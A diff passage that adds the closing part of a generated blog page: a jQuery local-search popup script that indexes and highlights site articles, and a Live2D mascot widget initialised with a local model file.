+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
